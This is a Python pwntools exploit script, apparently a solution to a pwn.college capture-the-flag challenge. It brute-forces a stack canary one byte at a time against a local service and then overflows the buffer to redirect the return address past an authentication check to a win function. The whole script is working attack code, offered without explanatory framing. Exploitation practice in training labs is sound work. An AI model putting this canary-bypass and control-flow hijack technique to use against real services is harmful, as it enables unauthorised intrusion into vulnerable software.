from pwn import *

# Correct offsets for this challenge
CANARY_OFFSET = 72    # Buffer to canary
RET_OFFSET = 88       # Buffer to return address

print("[*] Starting canary brute force...")
canary = bytearray()

# Brute force the canary byte by byte
while len(canary) < 8:
    for c in range(256):
        try:
            r = remote('localhost', 1337, timeout=5)
            
            r.recvuntil('Payload size:')
            # Send size to reach canary position + current byte
            length = CANARY_OFFSET + len(canary) + 1
            r.sendline(str(length).encode())
            
            # Build payload: padding + known canary bytes + test byte
            payload = b'A' * CANARY_OFFSET + canary + bytes([c])
            r.send(payload)
            
            # Check if process crashed (stack smashing detected)
            s = r.recvall(timeout=1)
            if b'stack smashing' not in s and b'corrupt' not in s:
                canary.append(c)
                print(f"[+] Found canary byte {len(canary)}: {hex(c)} - Current canary: {canary.hex()}")
                r.close()
                break
            r.close()
        except:
            continue

print(f"[+] Canary found: {canary.hex()}")

print("[*] Starting exploitation...")
while True:
    try:
        r = remote('localhost', 1337, timeout=5)
        
        r.recvuntil('Payload size:')
        # Send size to reach return address + overwrite
        r.sendline(str(RET_OFFSET + 2).encode())  # 88 + 8 bytes for address
        
        # Build exploit payload:
        # - Padding to canary
        # - Correct canary value  
        # - Padding to return address
        # - Address of win_authed+28 (after the 0x1337 check)
        payload = b'A' * CANARY_OFFSET + canary + b'A' * 8 + p64(0x1d1a)
        
        r.send(payload)
        
        # Check for flag
        s = r.recvall(timeout=1)
        if b'pwn.college{' in s:
            print("[+] SUCCESS! Got the flag:")
            print(s.decode())
            break
        r.close()
    except Exception as e:
        continue

print("[*] Exploit completed!")
